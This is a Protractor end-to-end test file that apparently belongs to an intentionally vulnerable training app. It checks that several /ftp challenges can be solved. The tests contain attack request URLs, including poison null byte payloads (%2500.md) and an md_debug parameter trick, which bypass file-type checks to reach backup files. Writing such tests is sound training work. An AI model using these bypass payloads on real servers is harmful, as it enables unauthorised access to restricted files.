describe('/ftp', () => {
  describe('challenge "confidentialDocument"', () => {
    it('should be able to access file /ftp/acquisitions.md', () => {
      browser.driver.get(browser.baseUrl + '/ftp/acquisitions.md')
    })

    protractor.expect.challengeSolved({challenge: 'Confidential Document'})
  })

  describe('challenge "errorHandling"', () => {
    it('should leak information through error message accessing /ftp/easter.egg due to wrong file suffix', () => {
      browser.driver.get(browser.baseUrl + '/ftp/easter.egg')

      /* browser.driver.isElementPresent(by.id('stacktrace')).then(present => {
        expect(present).toBe(true)
      }) */

      protractor.expect.challengeSolved({challenge: 'Error Handling'})
    })
  })

  describe('challenge "forgottenBackup"', () => {
    it('should be able to access file /ftp/coupons_2013.md.bak abusing md_debug parameter', () => {
      browser.driver.get(browser.baseUrl + '/ftp/coupons_2013.md.bak?md_debug=.md')
    })

    protractor.expect.challengeSolved({challenge: 'Forgotten Sales Backup'})
  })

  describe('challenge "forgottenDevBackup"', () => {
    it('should be able to access file /ftp/package.json.bak with poison null byte attack', () => {
      browser.driver.get(browser.baseUrl + '/ftp/package.json.bak%2500.md')
    })

    protractor.expect.challengeSolved({challenge: 'Forgotten Developer Backup'})
  })

  describe('challenge "easterEgg1"', () => {
    it('should be able to access file /ftp/easter.egg with poison null byte attack', () => {
      browser.driver.get(browser.baseUrl + '/ftp/eastere.gg%2500.md')
    })

    protractor.expect.challengeSolved({challenge: 'Easter Egg Tier 1'})
  })
})
